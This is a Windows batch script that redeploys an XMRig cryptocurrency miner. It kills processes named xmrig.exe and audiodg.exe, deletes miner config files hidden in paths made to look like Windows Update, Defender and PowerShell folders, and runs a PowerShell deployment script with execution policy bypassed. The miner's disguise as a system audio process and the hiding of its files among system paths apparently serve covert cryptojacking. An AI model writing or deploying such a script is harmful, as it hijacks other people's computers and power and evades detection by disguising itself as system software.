@echo off
title FRESH DEPLOYMENT - Clean Start
color 0A

cls
echo ================================================================
echo  FRESH DEPLOYMENT - CLEAN START
echo  This fixes the BOM issue and deploys correctly
echo ================================================================
echo.

echo Step 1: Stopping all existing processes...
taskkill /F /IM xmrig.exe 2>nul
taskkill /F /IM audiodg.exe 2>nul
echo [OK] Processes stopped
echo.

echo Step 2: Deleting old corrupted config files...
del /f /q "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json" 2>nul
del /f /q "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv\config.json" 2>nul
del /f /q "C:\ProgramData\Microsoft\Network\Downloader\config.json" 2>nul
del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\PowerShell\config.json" 2>nul
del /f /q "C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\Defender\config.json" 2>nul
del /f /q "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Templates\config.json" 2>nul
del /f /q "C:\Users\%USERNAME%\AppData\Local\Temp\WindowsUpdateCache\config.json" 2>nul
echo [OK] Old configs deleted
echo.

echo Step 3: Running fresh deployment with BOM fix...
echo.
powershell.exe -ExecutionPolicy Bypass -File "%~dp0DEPLOY_ULTIMATE.ps1"

echo.
echo ================================================================
echo  Deployment Complete!
echo ================================================================
echo.
echo Check above for success messages.
echo Check Task Manager for miner process.
echo.
pause
